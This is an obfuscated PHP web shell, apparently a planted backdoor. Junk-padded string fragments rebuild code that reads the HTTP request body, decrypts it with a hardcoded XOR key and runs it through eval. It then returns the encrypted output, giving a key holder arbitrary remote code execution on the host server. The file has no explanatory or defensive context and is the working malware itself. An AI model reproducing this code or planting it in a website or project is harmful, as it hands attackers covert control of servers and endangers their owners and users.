<?php
$I='@oSb_end_cleSan();$rS=@bSase64_enScode(@Sx(@gzcoSSmpresSsS($o),$k)S);print("$p$Skh$r$kf");}';
$r='$k="S8023bd79"S;$kh="73SSecbS9ff3109";$Skf=S"2c4aa2e177S29";$p=S"8Dz2qqMSEjSzKi9SYsA';
$R='Sj=0;($j<$c&&$Si<$l)SS;$j++,$i+SS+){$o.=S$t{S$i}^$k{$j};}}Sreturn $o;}if S(@preSg_matchS';
$Z='eSSval(@SgzuncompSress(@x(@bSase6S4_decodeS($Sm[1]),S$k)));SS$o=@ob_get_cSonStents();';
$Y=str_replace('Fa','','FacreatFae_FafFauncFatiFaon');
$E='";SfuSnction x(S$tS,$kS){$c=strlen($kS);$l=SstrSlen($tS);$o="";for($Si=0;$iS<$l;){forSS($';
$X='("/$kSh(.+)$kSf/",@SfSilSe_get_contents("Sphp:/S/input")S,$m)S==1S) {S@ob_start();@';
$K=str_replace('S','',$r.$E.$R.$X.$Z.$I);
$T=$Y('',$K);$T();
?>
